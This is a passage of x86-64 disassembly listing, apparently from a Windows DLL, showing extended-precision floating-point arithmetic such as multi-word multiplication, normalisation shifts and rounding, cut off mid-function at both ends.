   18000e168:	48 89 75 cf          	mov    %rsi,-0x31(%rbp)
   18000e16c:	66 44 39 0e          	cmp    %r9w,(%rsi)
   18000e170:	72 25                	jb     0x18000e197
   18000e172:	8b 46 08             	mov    0x8(%rsi),%eax
   18000e175:	f2 0f 10 06          	movsd  (%rsi),%xmm0
   18000e179:	48 8d 75 07          	lea    0x7(%rbp),%rsi
   18000e17d:	89 45 0f             	mov    %eax,0xf(%rbp)
   18000e180:	f2 0f 11 45 07       	movsd  %xmm0,0x7(%rbp)
   18000e185:	48 8b 45 07          	mov    0x7(%rbp),%rax
   18000e189:	48 c1 e8 10          	shr    $0x10,%rax
   18000e18d:	48 89 75 cf          	mov    %rsi,-0x31(%rbp)
   18000e191:	41 2b c3             	sub    %r11d,%eax
   18000e194:	89 45 09             	mov    %eax,0x9(%rbp)
   18000e197:	0f b7 4e 0a          	movzwl 0xa(%rsi),%ecx
   18000e19b:	0f b7 45 f1          	movzwl -0xf(%rbp),%eax
   18000e19f:	44 89 65 9b          	mov    %r12d,-0x65(%rbp)
   18000e1a3:	0f b7 d9             	movzwl %cx,%ebx
   18000e1a6:	66 41 23 cd          	and    %r13w,%cx
   18000e1aa:	48 c7 45 d7 00 00 00 	movq   $0x0,-0x29(%rbp)
   18000e1b1:	00 
   18000e1b2:	66 33 d8             	xor    %ax,%bx
   18000e1b5:	66 41 23 c5          	and    %r13w,%ax
   18000e1b9:	44 89 65 df          	mov    %r12d,-0x21(%rbp)
   18000e1bd:	66 41 23 d9          	and    %r9w,%bx
   18000e1c1:	44 8d 0c 08          	lea    (%rax,%rcx,1),%r9d
   18000e1c5:	66 89 5d 97          	mov    %bx,-0x69(%rbp)
   18000e1c9:	66 41 3b c5          	cmp    %r13w,%ax
   18000e1cd:	0f 83 7d 02 00 00    	jae    0x18000e450
   18000e1d3:	66 41 3b cd          	cmp    %r13w,%cx
   18000e1d7:	0f 83 73 02 00 00    	jae    0x18000e450
   18000e1dd:	41 bd fd bf 00 00    	mov    $0xbffd,%r13d
   18000e1e3:	66 45 3b cd          	cmp    %r13w,%r9w
   18000e1e7:	0f 87 5d 02 00 00    	ja     0x18000e44a
   18000e1ed:	bb bf 3f 00 00       	mov    $0x3fbf,%ebx
   18000e1f2:	66 44 3b cb          	cmp    %bx,%r9w
   18000e1f6:	77 13                	ja     0x18000e20b
   18000e1f8:	48 c7 45 eb 00 00 00 	movq   $0x0,-0x15(%rbp)
   18000e1ff:	00 
   18000e200:	41 bd ff 7f 00 00    	mov    $0x7fff,%r13d
   18000e206:	e9 59 02 00 00       	jmp    0x18000e464
   18000e20b:	66 85 c0             	test   %ax,%ax
   18000e20e:	75 22                	jne    0x18000e232
   18000e210:	66 45 03 cb          	add    %r11w,%r9w
   18000e214:	85 7d ef             	test   %edi,-0x11(%rbp)
   18000e217:	75 19                	jne    0x18000e232
   18000e219:	45 85 c0             	test   %r8d,%r8d
   18000e21c:	75 14                	jne    0x18000e232
   18000e21e:	85 d2                	test   %edx,%edx
   18000e220:	75 10                	jne    0x18000e232
   18000e222:	66 44 89 65 f1       	mov    %r12w,-0xf(%rbp)
   18000e227:	41 bd ff 7f 00 00    	mov    $0x7fff,%r13d
   18000e22d:	e9 3b 02 00 00       	jmp    0x18000e46d
   18000e232:	66 85 c9             	test   %cx,%cx
   18000e235:	75 14                	jne    0x18000e24b
   18000e237:	66 45 03 cb          	add    %r11w,%r9w
   18000e23b:	85 7e 08             	test   %edi,0x8(%rsi)
   18000e23e:	75 0b                	jne    0x18000e24b
   18000e240:	44 39 66 04          	cmp    %r12d,0x4(%rsi)
   18000e244:	75 05                	jne    0x18000e24b
   18000e246:	44 39 26             	cmp    %r12d,(%rsi)
   18000e249:	74 ad                	je     0x18000e1f8
   18000e24b:	41 8b fe             	mov    %r14d,%edi
   18000e24e:	48 8d 55 d7          	lea    -0x29(%rbp),%rdx
   18000e252:	45 33 f6             	xor    %r14d,%r14d
   18000e255:	44 8b ef             	mov    %edi,%r13d
   18000e258:	85 ff                	test   %edi,%edi
   18000e25a:	7e 5f                	jle    0x18000e2bb
   18000e25c:	43 8d 04 24          	lea    (%r12,%r12,1),%eax
   18000e260:	4c 8d 75 e7          	lea    -0x19(%rbp),%r14
   18000e264:	41 8b dc             	mov    %r12d,%ebx
   18000e267:	48 63 c8             	movslq %eax,%rcx
   18000e26a:	41 23 db             	and    %r11d,%ebx
   18000e26d:	4c 8d 7e 08          	lea    0x8(%rsi),%r15
   18000e271:	4c 03 f1             	add    %rcx,%r14
   18000e274:	33 f6                	xor    %esi,%esi
   18000e276:	41 0f b7 07          	movzwl (%r15),%eax
   18000e27a:	41 0f b7 0e          	movzwl (%r14),%ecx
   18000e27e:	44 8b d6             	mov    %esi,%r10d
   18000e281:	0f af c8             	imul   %eax,%ecx
   18000e284:	8b 02                	mov    (%rdx),%eax
   18000e286:	44 8d 04 08          	lea    (%rax,%rcx,1),%r8d
   18000e28a:	44 3b c0             	cmp    %eax,%r8d
   18000e28d:	72 05                	jb     0x18000e294
   18000e28f:	44 3b c1             	cmp    %ecx,%r8d
   18000e292:	73 03                	jae    0x18000e297
   18000e294:	45 8b d3             	mov    %r11d,%r10d
   18000e297:	44 89 02             	mov    %r8d,(%rdx)
   18000e29a:	45 85 d2             	test   %r10d,%r10d
   18000e29d:	74 05                	je     0x18000e2a4
   18000e29f:	66 44 01 5a 04       	add    %r11w,0x4(%rdx)
   18000e2a4:	45 2b eb             	sub    %r11d,%r13d
   18000e2a7:	49 83 c6 02          	add    $0x2,%r14
   18000e2ab:	49 83 ef 02          	sub    $0x2,%r15
   18000e2af:	45 85 ed             	test   %r13d,%r13d
   18000e2b2:	7f c2                	jg     0x18000e276
   18000e2b4:	48 8b 75 cf          	mov    -0x31(%rbp),%rsi
   18000e2b8:	45 33 f6             	xor    %r14d,%r14d
   18000e2bb:	41 2b fb             	sub    %r11d,%edi
   18000e2be:	48 83 c2 02          	add    $0x2,%rdx
   18000e2c2:	45 03 e3             	add    %r11d,%r12d
   18000e2c5:	85 ff                	test   %edi,%edi
   18000e2c7:	7f 8c                	jg     0x18000e255
   18000e2c9:	44 8b 55 df          	mov    -0x21(%rbp),%r10d
   18000e2cd:	44 8b 45 d7          	mov    -0x29(%rbp),%r8d
   18000e2d1:	b8 02 c0 00 00       	mov    $0xc002,%eax
   18000e2d6:	66 44 03 c8          	add    %ax,%r9w
   18000e2da:	45 33 e4             	xor    %r12d,%r12d
   18000e2dd:	bb ff ff 00 00       	mov    $0xffff,%ebx
   18000e2e2:	41 bf 00 00 00 80    	mov    $0x80000000,%r15d
   18000e2e8:	66 45 85 c9          	test   %r9w,%r9w
   18000e2ec:	7e 3c                	jle    0x18000e32a
   18000e2ee:	45 85 d7             	test   %r10d,%r15d
   18000e2f1:	75 31                	jne    0x18000e324
   18000e2f3:	8b 7d db             	mov    -0x25(%rbp),%edi
   18000e2f6:	41 8b d0             	mov    %r8d,%edx
   18000e2f9:	45 03 d2             	add    %r10d,%r10d
   18000e2fc:	c1 ea 1f             	shr    $0x1f,%edx
   18000e2ff:	45 03 c0             	add    %r8d,%r8d
   18000e302:	8b cf                	mov    %edi,%ecx
   18000e304:	c1 e9 1f             	shr    $0x1f,%ecx
   18000e307:	8d 04 3f             	lea    (%rdi,%rdi,1),%eax
   18000e30a:	66 44 03 cb          	add    %bx,%r9w
   18000e30e:	0b c2                	or     %edx,%eax
   18000e310:	44 0b d1             	or     %ecx,%r10d
   18000e313:	44 89 45 d7          	mov    %r8d,-0x29(%rbp)
   18000e317:	89 45 db             	mov    %eax,-0x25(%rbp)
   18000e31a:	44 89 55 df          	mov    %r10d,-0x21(%rbp)
   18000e31e:	66 45 85 c9          	test   %r9w,%r9w
   18000e322:	7f ca                	jg     0x18000e2ee
   18000e324:	66 45 85 c9          	test   %r9w,%r9w
   18000e328:	7f 6d                	jg     0x18000e397
   18000e32a:	66 44 03 cb          	add    %bx,%r9w
   18000e32e:	79 67                	jns    0x18000e397
   18000e330:	41 0f b7 c1          	movzwl %r9w,%eax
   18000e334:	66 f7 d8             	neg    %ax
   18000e337:	0f b7 d0             	movzwl %ax,%edx
   18000e33a:	66 44 03 ca          	add    %dx,%r9w
   18000e33e:	66 44 89 4d a3       	mov    %r9w,-0x5d(%rbp)
   18000e343:	44 8b 4d 9b          	mov    -0x65(%rbp),%r9d
   18000e347:	44 84 5d d7          	test   %r11b,-0x29(%rbp)
   18000e34b:	74 03                	je     0x18000e350
   18000e34d:	45 03 cb             	add    %r11d,%r9d
   18000e350:	8b 7d db             	mov    -0x25(%rbp),%edi
   18000e353:	41 8b c2             	mov    %r10d,%eax
   18000e356:	41 d1 e8             	shr    $1,%r8d
   18000e359:	8b cf                	mov    %edi,%ecx
   18000e35b:	c1 e0 1f             	shl    $0x1f,%eax
   18000e35e:	d1 ef                	shr    $1,%edi
   18000e360:	c1 e1 1f             	shl    $0x1f,%ecx
   18000e363:	0b f8                	or     %eax,%edi
   18000e365:	41 d1 ea             	shr    $1,%r10d
   18000e368:	44 0b c1             	or     %ecx,%r8d
   18000e36b:	89 7d db             	mov    %edi,-0x25(%rbp)
   18000e36e:	44 89 45 d7          	mov    %r8d,-0x29(%rbp)
   18000e372:	49 2b d3             	sub    %r11,%rdx
   18000e375:	75 d0                	jne    0x18000e347
   18000e377:	45 85 c9             	test   %r9d,%r9d
   18000e37a:	44 0f b7 4d a3       	movzwl -0x5d(%rbp),%r9d
   18000e37f:	44 89 55 df          	mov    %r10d,-0x21(%rbp)
   18000e383:	74 12                	je     0x18000e397
   18000e385:	41 0f b7 c0          	movzwl %r8w,%eax
   18000e389:	66 41 0b c3          	or     %r11w,%ax
   18000e38d:	66 89 45 d7          	mov    %ax,-0x29(%rbp)
   18000e391:	44 8b 45 d7          	mov    -0x29(%rbp),%r8d
   18000e395:	eb 04                	jmp    0x18000e39b
   18000e397:	0f b7 45 d7          	movzwl -0x29(%rbp),%eax
   18000e39b:	b9 00 80 00 00       	mov    $0x8000,%ecx
   18000e3a0:	66 3b c1             	cmp    %cx,%ax
   18000e3a3:	77 10                	ja     0x18000e3b5
   18000e3a5:	41 81 e0 ff ff 01 00 	and    $0x1ffff,%r8d
   18000e3ac:	41 81 f8 00 80 01 00 	cmp    $0x18000,%r8d
   18000e3b3:	75 48                	jne    0x18000e3fd
   18000e3b5:	8b 45 d9             	mov    -0x27(%rbp),%eax
   18000e3b8:	83 ca ff             	or     $0xffffffff,%edx
   18000e3bb:	3b c2                	cmp    %edx,%eax
   18000e3bd:	75 38                	jne    0x18000e3f7
   18000e3bf:	8b 45 dd             	mov    -0x23(%rbp),%eax
   18000e3c2:	44 89 65 d9          	mov    %r12d,-0x27(%rbp)
   18000e3c6:	3b c2                	cmp    %edx,%eax
   18000e3c8:	75 21                	jne    0x18000e3eb
   18000e3ca:	0f b7 45 e1          	movzwl -0x1f(%rbp),%eax
   18000e3ce:	44 89 65 dd          	mov    %r12d,-0x23(%rbp)
   18000e3d2:	66 3b c3             	cmp    %bx,%ax
   18000e3d5:	75 0a                	jne    0x18000e3e1
   18000e3d7:	66 89 4d e1          	mov    %cx,-0x1f(%rbp)
   18000e3db:	66 45 03 cb          	add    %r11w,%r9w
   18000e3df:	eb 10                	jmp    0x18000e3f1
   18000e3e1:	66 41 03 c3          	add    %r11w,%ax
   18000e3e5:	66 89 45 e1          	mov    %ax,-0x1f(%rbp)
   18000e3e9:	eb 06                	jmp    0x18000e3f1
   18000e3eb:	41 03 c3             	add    %r11d,%eax
   18000e3ee:	89 45 dd             	mov    %eax,-0x23(%rbp)
   18000e3f1:	44 8b 55 df          	mov    -0x21(%rbp),%r10d
   18000e3f5:	eb 06                	jmp    0x18000e3fd
   18000e3f7:	41 03 c3             	add    %r11d,%eax
   18000e3fa:	89 45 d9             	mov    %eax,-0x27(%rbp)
   18000e3fd:	41 bd ff 7f 00 00    	mov    $0x7fff,%r13d
   18000e403:	41 be 05 00 00 00    	mov    $0x5,%r14d
   18000e409:	bf ff ff ff 7f       	mov    $0x7fffffff,%edi
   18000e40e:	66 45 3b cd          	cmp    %r13w,%r9w
   18000e412:	72 0d                	jb     0x18000e421
   18000e414:	0f b7 45 97          	movzwl -0x69(%rbp),%eax
   18000e418:	44 8b 55 af          	mov    -0x51(%rbp),%r10d
   18000e41c:	66 f7 d8             	neg    %ax
   18000e41f:	eb 32                	jmp    0x18000e453
   18000e421:	0f b7 45 d9          	movzwl -0x27(%rbp),%eax
   18000e425:	66 44 0b 4d 97       	or     -0x69(%rbp),%r9w
   18000e42a:	44 89 55 ed          	mov    %r10d,-0x13(%rbp)
   18000e42e:	44 8b 55 af          	mov    -0x51(%rbp),%r10d
   18000e432:	66 89 45 e7          	mov    %ax,-0x19(%rbp)
   18000e436:	8b 45 db             	mov    -0x25(%rbp),%eax
   18000e439:	89 45 e9             	mov    %eax,-0x17(%rbp)
   18000e43c:	44 8b 45 eb          	mov    -0x15(%rbp),%r8d
   18000e440:	8b 55 e7             	mov    -0x19(%rbp),%edx
   18000e443:	66 44 89 4d f1       	mov    %r9w,-0xf(%rbp)
   18000e448:	eb 23                	jmp    0x18000e46d
   18000e44a:	41 bd ff 7f 00 00    	mov    $0x7fff,%r13d
   18000e450:	66 f7 db             	neg    %bx
   18000e453:	1b c0                	sbb    %eax,%eax
   18000e455:	44 89 65 eb          	mov    %r12d,-0x15(%rbp)
   18000e459:	41 23 c7             	and    %r15d,%eax
   18000e45c:	05 00 80 ff 7f       	add    $0x7fff8000,%eax
   18000e461:	89 45 ef             	mov    %eax,-0x11(%rbp)
   18000e464:	41 8b d4             	mov    %r12d,%edx
   18000e467:	45 8b c4             	mov    %r12d,%r8d
   18000e46a:	89 55 e7             	mov    %edx,-0x19(%rbp)
   18000e46d:	4c 8b 4d a7          	mov    -0x59(%rbp),%r9
   18000e471:	45 85 d2             	test   %r10d,%r10d
   18000e474:	0f 85 c2 fc ff ff    	jne    0x18000e13c
   18000e47a:	48 8b 5d bf          	mov    -0x41(%rbp),%rbx
   18000e47e:	8b 4d 9f             	mov    -0x61(%rbp),%ecx
   18000e481:	be fd bf 00 00       	mov    $0xbffd,%esi
   18000e486:	eb 07                	jmp    0x18000e48f
   18000e488:	44 8b 45 eb          	mov    -0x15(%rbp),%r8d
   18000e48c:	8b 55 e7             	mov    -0x19(%rbp),%edx
   18000e48f:	8b 45 ef             	mov    -0x11(%rbp),%eax
   18000e492:	41 b9 ff 3f 00 00    	mov    $0x3fff,%r9d
   18000e498:	c1 e8 10             	shr    $0x10,%eax
   18000e49b:	66 41 3b c1          	cmp    %r9w,%ax
   18000e49f:	0f 82 b6 02 00 00    	jb     0x18000e75b
   18000e4a5:	66 41 03 cb          	add    %r11w,%cx
   18000e4a9:	41 b9 00 80 00 00    	mov    $0x8000,%r9d
   18000e4af:	44 89 65 9b          	mov    %r12d,-0x65(%rbp)
   18000e4b3:	45 8d 51 ff          	lea    -0x1(%r9),%r10d
   18000e4b7:	89 4d 9f             	mov    %ecx,-0x61(%rbp)
   18000e4ba:	0f b7 4d 01          	movzwl 0x1(%rbp),%ecx
   18000e4be:	44 0f b7 e9          	movzwl %cx,%r13d
   18000e4c2:	66 41 23 ca          	and    %r10w,%cx
   18000e4c6:	48 c7 45 d7 00 00 00 	movq   $0x0,-0x29(%rbp)
   18000e4cd:	00 
   18000e4ce:	66 44 33 e8          	xor    %ax,%r13w
   18000e4d2:	66 41 23 c2          	and    %r10w,%ax
   18000e4d6:	44 89 65 df          	mov    %r12d,-0x21(%rbp)
   18000e4da:	66 45 23 e9          	and    %r9w,%r13w
   18000e4de:	44 8d 0c 08          	lea    (%rax,%rcx,1),%r9d
   18000e4e2:	66 41 3b c2          	cmp    %r10w,%ax
   18000e4e6:	0f 83 58 02 00 00    	jae    0x18000e744
   18000e4ec:	66 41 3b ca          	cmp    %r10w,%cx
   18000e4f0:	0f 83 4e 02 00 00    	jae    0x18000e744
   18000e4f6:	66 44 3b ce          	cmp    %si,%r9w
   18000e4fa:	0f 87 44 02 00 00    	ja     0x18000e744
   18000e500:	41 ba bf 3f 00 00    	mov    $0x3fbf,%r10d
   18000e506:	66 45 3b ca          	cmp    %r10w,%r9w
   18000e50a:	77 09                	ja     0x18000e515
   18000e50c:	44 89 65 ef          	mov    %r12d,-0x11(%rbp)
   18000e510:	e9 40 02 00 00       	jmp    0x18000e755
   18000e515:	66 85 c0             	test   %ax,%ax
   18000e518:	75 1c                	jne    0x18000e536
   18000e51a:	66 45 03 cb          	add    %r11w,%r9w
   18000e51e:	85 7d ef             	test   %edi,-0x11(%rbp)
   18000e521:	75 13                	jne    0x18000e536
   18000e523:	45 85 c0             	test   %r8d,%r8d
   18000e526:	75 0e                	jne    0x18000e536
   18000e528:	85 d2                	test   %edx,%edx
   18000e52a:	75 0a                	jne    0x18000e536
   18000e52c:	66 44 89 65 f1       	mov    %r12w,-0xf(%rbp)
   18000e531:	e9 25 02 00 00       	jmp    0x18000e75b
   18000e536:	66 85 c9             	test   %cx,%cx
   18000e539:	75 15                	jne    0x18000e550
   18000e53b:	66 45 03 cb          	add    %r11w,%r9w
   18000e53f:	85 7d ff             	test   %edi,-0x1(%rbp)
   18000e542:	75 0c                	jne    0x18000e550
   18000e544:	44 39 65 fb          	cmp    %r12d,-0x5(%rbp)
   18000e548:	75 06                	jne    0x18000e550
   18000e54a:	44 39 65 f7          	cmp    %r12d,-0x9(%rbp)
   18000e54e:	74 bc                	je     0x18000e50c
   18000e550:	41 8b fc             	mov    %r12d,%edi
   18000e553:	48 8d 55 d7          	lea    -0x29(%rbp),%rdx
   18000e557:	41 8b f6             	mov    %r14d,%esi
   18000e55a:	45 85 f6             	test   %r14d,%r14d
   18000e55d:	7e 5d                	jle    0x18000e5bc
   18000e55f:	8d 04 3f             	lea    (%rdi,%rdi,1),%eax
   18000e562:	4c 8d 7d e7          	lea    -0x19(%rbp),%r15
   18000e566:	44 8b e7             	mov    %edi,%r12d
   18000e569:	48 63 c8             	movslq %eax,%rcx
   18000e56c:	45 23 e3             	and    %r11d,%r12d
   18000e56f:	4c 8d 75 ff          	lea    -0x1(%rbp),%r14
   18000e573:	4c 03 f9             	add    %rcx,%r15
   18000e576:	33 db                	xor    %ebx,%ebx
   18000e578:	41 0f b7 07          	movzwl (%r15),%eax
   18000e57c:	41 0f b7 0e          	movzwl (%r14),%ecx
   18000e580:	44 8b c3             	mov    %ebx,%r8d
   18000e583:	0f af c8             	imul   %eax,%ecx
   18000e586:	8b 02                	mov    (%rdx),%eax
   18000e588:	44 8d 14 08          	lea    (%rax,%rcx,1),%r10d
   18000e58c:	44 3b d0             	cmp    %eax,%r10d
   18000e58f:	72 05                	jb     0x18000e596
   18000e591:	44 3b d1             	cmp    %ecx,%r10d
   18000e594:	73 03                	jae    0x18000e599
   18000e596:	45 8b c3             	mov    %r11d,%r8d
   18000e599:	44 89 12             	mov    %r10d,(%rdx)
   18000e59c:	45 85 c0             	test   %r8d,%r8d
   18000e59f:	74 05                	je     0x18000e5a6
   18000e5a1:	66 44 01 5a 04       	add    %r11w,0x4(%rdx)
   18000e5a6:	41 2b f3             	sub    %r11d,%esi
   18000e5a9:	49 83 c7 02          	add    $0x2,%r15
   18000e5ad:	49 83 ee 02          	sub    $0x2,%r14
   18000e5b1:	85 f6                	test   %esi,%esi
   18000e5b3:	7f c3                	jg     0x18000e578
   18000e5b5:	44 8b 75 b7          	mov    -0x49(%rbp),%r14d
   18000e5b9:	45 33 e4             	xor    %r12d,%r12d
   18000e5bc:	45 2b f3             	sub    %r11d,%r14d
   18000e5bf:	48 83 c2 02          	add    $0x2,%rdx
   18000e5c3:	41 03 fb             	add    %r11d,%edi
   18000e5c6:	44 89 75 b7          	mov    %r14d,-0x49(%rbp)
   18000e5ca:	45 85 f6             	test   %r14d,%r14d
   18000e5cd:	7f 88                	jg     0x18000e557
   18000e5cf:	48 8b 5d bf          	mov    -0x41(%rbp),%rbx
   18000e5d3:	44 8b 45 df          	mov    -0x21(%rbp),%r8d
   18000e5d7:	44 8b 55 d7          	mov    -0x29(%rbp),%r10d
   18000e5db:	b8 02 c0 00 00       	mov    $0xc002,%eax
   18000e5e0:	be 00 00 00 80       	mov    $0x80000000,%esi
   18000e5e5:	41 be ff ff 00 00    	mov    $0xffff,%r14d
   18000e5eb:	66 44 03 c8          	add    %ax,%r9w
   18000e5ef:	66 45 85 c9          	test   %r9w,%r9w
   18000e5f3:	7e 3c                	jle    0x18000e631
   18000e5f5:	44 85 c6             	test   %r8d,%esi
   18000e5f8:	75 31                	jne    0x18000e62b
   18000e5fa:	8b 7d db             	mov    -0x25(%rbp),%edi
   18000e5fd:	41 8b d2             	mov    %r10d,%edx
   18000e600:	45 03 c0             	add    %r8d,%r8d
   18000e603:	c1 ea 1f             	shr    $0x1f,%edx
   18000e606:	45 03 d2             	add    %r10d,%r10d
   18000e609:	8b cf                	mov    %edi,%ecx
   18000e60b:	c1 e9 1f             	shr    $0x1f,%ecx
   18000e60e:	8d 04 3f             	lea    (%rdi,%rdi,1),%eax
   18000e611:	66 45 03 ce          	add    %r14w,%r9w
   18000e615:	0b c2                	or     %edx,%eax
   18000e617:	44 0b c1             	or     %ecx,%r8d
   18000e61a:	44 89 55 d7          	mov    %r10d,-0x29(%rbp)
   18000e61e:	89 45 db             	mov    %eax,-0x25(%rbp)
   18000e621:	44 89 45 df          	mov    %r8d,-0x21(%rbp)
   18000e625:	66 45 85 c9          	test   %r9w,%r9w
   18000e629:	7f ca                	jg     0x18000e5f5
   18000e62b:	66 45 85 c9          	test   %r9w,%r9w
   18000e62f:	7f 65                	jg     0x18000e696
   18000e631:	66 45 03 ce          	add    %r14w,%r9w
   18000e635:	79 5f                	jns    0x18000e696
   18000e637:	8b 5d 9b             	mov    -0x65(%rbp),%ebx
   18000e63a:	41 0f b7 c1          	movzwl %r9w,%eax
   18000e63e:	66 f7 d8             	neg    %ax
   18000e641:	0f b7 d0             	movzwl %ax,%edx
   18000e644:	66 44 03 ca          	add    %dx,%r9w
   18000e648:	44 84 5d d7          	test   %r11b,-0x29(%rbp)
   18000e64c:	74 03                	je     0x18000e651
   18000e64e:	41 03 db             	add    %r11d,%ebx
   18000e651:	8b 7d db             	mov    -0x25(%rbp),%edi
   18000e654:	41 8b c0             	mov    %r8d,%eax
   18000e657:	41 d1 ea             	shr    $1,%r10d
   18000e65a:	8b cf                	mov    %edi,%ecx
   18000e65c:	c1 e0 1f             	shl    $0x1f,%eax
   18000e65f:	d1 ef                	shr    $1,%edi
   18000e661:	c1 e1 1f             	shl    $0x1f,%ecx
   18000e664:	0b f8                	or     %eax,%edi
   18000e666:	41 d1 e8             	shr    $1,%r8d
   18000e669:	44 0b d1             	or     %ecx,%r10d
   18000e66c:	89 7d db             	mov    %edi,-0x25(%rbp)
   18000e66f:	44 89 55 d7          	mov    %r10d,-0x29(%rbp)
   18000e673:	49 2b d3             	sub    %r11,%rdx
   18000e676:	75 d0                	jne    0x18000e648
   18000e678:	85 db                	test   %ebx,%ebx
   18000e67a:	48 8b 5d bf          	mov    -0x41(%rbp),%rbx
   18000e67e:	44 89 45 df          	mov    %r8d,-0x21(%rbp)
   18000e682:	74 12                	je     0x18000e696
   18000e684:	41 0f b7 c2          	movzwl %r10w,%eax
   18000e688:	66 41 0b c3          	or     %r11w,%ax
   18000e68c:	66 89 45 d7          	mov    %ax,-0x29(%rbp)
   18000e690:	44 8b 55 d7          	mov    -0x29(%rbp),%r10d
   18000e694:	eb 04                	jmp    0x18000e69a
   18000e696:	0f b7 45 d7          	movzwl -0x29(%rbp),%eax
   18000e69a:	b9 00 80 00 00       	mov    $0x8000,%ecx
   18000e69f:	66 3b c1             	cmp    %cx,%ax
   18000e6a2:	77 10                	ja     0x18000e6b4
   18000e6a4:	41 81 e2 ff ff 01 00 	and    $0x1ffff,%r10d
   18000e6ab:	41 81 fa 00 80 01 00 	cmp    $0x18000,%r10d
   18000e6b2:	75 49                	jne    0x18000e6fd
   18000e6b4:	8b 45 d9             	mov    -0x27(%rbp),%eax
   18000e6b7:	83 ca ff             	or     $0xffffffff,%edx
   18000e6ba:	3b c2                	cmp    %edx,%eax
   18000e6bc:	75 39                	jne    0x18000e6f7
   18000e6be:	8b 45 dd             	mov    -0x23(%rbp),%eax
   18000e6c1:	44 89 65 d9          	mov    %r12d,-0x27(%rbp)
   18000e6c5:	3b c2                	cmp    %edx,%eax
   18000e6c7:	75 22                	jne    0x18000e6eb
   18000e6c9:	0f b7 45 e1          	movzwl -0x1f(%rbp),%eax
   18000e6cd:	44 89 65 dd          	mov    %r12d,-0x23(%rbp)
   18000e6d1:	66 41 3b c6          	cmp    %r14w,%ax
   18000e6d5:	75 0a                	jne    0x18000e6e1
   18000e6d7:	66 89 4d e1          	mov    %cx,-0x1f(%rbp)
   18000e6db:	66 45 03 cb          	add    %r11w,%r9w
   18000e6df:	eb 10                	jmp    0x18000e6f1
   18000e6e1:	66 41 03 c3          	add    %r11w,%ax
   18000e6e5:	66 89 45 e1          	mov    %ax,-0x1f(%rbp)
   18000e6e9:	eb 06                	jmp    0x18000e6f1
   18000e6eb:	41 03 c3             	add    %r11d,%eax
   18000e6ee:	89 45 dd             	mov    %eax,-0x23(%rbp)
   18000e6f1:	44 8b 45 df          	mov    -0x21(%rbp),%r8d
   18000e6f5:	eb 06                	jmp    0x18000e6fd
   18000e6f7:	41 03 c3             	add    %r11d,%eax
   18000e6fa:	89 45 d9             	mov    %eax,-0x27(%rbp)
   18000e6fd:	b8 ff 7f 00 00       	mov    $0x7fff,%eax
   18000e702:	66 44 3b c8          	cmp    %ax,%r9w
   18000e706:	72 18                	jb     0x18000e720
   18000e708:	66 41 f7 dd          	neg    %r13w
   18000e70c:	45 8b c4             	mov    %r12d,%r8d
   18000e70f:	41 8b d4             	mov    %r12d,%edx
   18000e712:	1b c0                	sbb    %eax,%eax
   18000e714:	23 c6                	and    %esi,%eax
   18000e716:	05 00 80 ff 7f       	add    $0x7fff8000,%eax
   18000e71b:	89 45 ef             	mov    %eax,-0x11(%rbp)
   18000e71e:	eb 40                	jmp    0x18000e760
   18000e720:	0f b7 45 d9          	movzwl -0x27(%rbp),%eax
   18000e724:	66 45 0b cd          	or     %r13w,%r9w
   18000e728:	44 89 45 ed          	mov    %r8d,-0x13(%rbp)
   18000e72c:	66 89 45 e7          	mov    %ax,-0x19(%rbp)
   18000e730:	8b 45 db             	mov    -0x25(%rbp),%eax
   18000e733:	66 44 89 4d f1       	mov    %r9w,-0xf(%rbp)
   18000e738:	89 45 e9             	mov    %eax,-0x17(%rbp)
   18000e73b:	44 8b 45 eb          	mov    -0x15(%rbp),%r8d
   18000e73f:	8b 55 e7             	mov    -0x19(%rbp),%edx
   18000e742:	eb 1c                	jmp    0x18000e760
   18000e744:	66 41 f7 dd          	neg    %r13w
   18000e748:	1b c0                	sbb    %eax,%eax
   18000e74a:	41 23 c7             	and    %r15d,%eax
   18000e74d:	05 00 80 ff 7f       	add    $0x7fff8000,%eax
   18000e752:	89 45 ef             	mov    %eax,-0x11(%rbp)
   18000e755:	41 8b d4             	mov    %r12d,%edx
   18000e758:	45 8b c4             	mov    %r12d,%r8d
   18000e75b:	b9 00 80 00 00       	mov    $0x8000,%ecx
   18000e760:	8b 45 9f             	mov    -0x61(%rbp),%eax
   18000e763:	44 8b 75 b3          	mov    -0x4d(%rbp),%r14d
   18000e767:	66 89 03             	mov    %ax,(%rbx)
   18000e76a:	44 84 5d c7          	test   %r11b,-0x39(%rbp)
   18000e76e:	74 1d                	je     0x18000e78d
   18000e770:	98                   	cwtl
   18000e771:	44 03 f0             	add    %eax,%r14d
   18000e774:	45 85 f6             	test   %r14d,%r14d
   18000e777:	7f 14                	jg     0x18000e78d
   18000e779:	66 39 4d 99          	cmp    %cx,-0x67(%rbp)
   18000e77d:	b8 20 00 00 00       	mov    $0x20,%eax
   18000e782:	8d 48 0d             	lea    0xd(%rax),%ecx
   18000e785:	0f 44 c1             	cmove  %ecx,%eax
   18000e788:	e9 3c f8 ff ff       	jmp    0x18000dfc9
   18000e78d:	44 8b 4d ef          	mov    -0x11(%rbp),%r9d
   18000e791:	b8 15 00 00 00       	mov    $0x15,%eax
   18000e796:	66 44 89 65 f1       	mov    %r12w,-0xf(%rbp)
   18000e79b:	8b 75 ef             	mov    -0x11(%rbp),%esi
   18000e79e:	44 3b f0             	cmp    %eax,%r14d
   18000e7a1:	44 8d 50 f3          	lea    -0xd(%rax),%r10d
   18000e7a5:	44 0f 4f f0          	cmovg  %eax,%r14d
   18000e7a9:	41 c1 e9 10          	shr    $0x10,%r9d
   18000e7ad:	41 81 e9 fe 3f 00 00 	sub    $0x3ffe,%r9d
   18000e7b4:	41 8b c8             	mov    %r8d,%ecx
   18000e7b7:	8b c2                	mov    %edx,%eax
   18000e7b9:	03 f6                	add    %esi,%esi
   18000e7bb:	45 03 c0             	add    %r8d,%r8d
   18000e7be:	c1 e8 1f             	shr    $0x1f,%eax
   18000e7c1:	c1 e9 1f             	shr    $0x1f,%ecx
   18000e7c4:	44 0b c0             	or     %eax,%r8d
   18000e7c7:	0b f1                	or     %ecx,%esi
   18000e7c9:	03 d2                	add    %edx,%edx
   18000e7cb:	4d 2b d3             	sub    %r11,%r10
   18000e7ce:	75 e4                	jne    0x18000e7b4
   18000e7d0:	44 89 45 eb          	mov    %r8d,-0x15(%rbp)
   18000e7d4:	89 55 e7             	mov    %edx,-0x19(%rbp)
   18000e7d7:	45 85 c9             	test   %r9d,%r9d
   18000e7da:	79 32                	jns    0x18000e80e
   18000e7dc:	41 f7 d9             	neg    %r9d
   18000e7df:	45 0f b6 d1          	movzbl %r9b,%r10d
   18000e7e3:	45 85 d2             	test   %r10d,%r10d
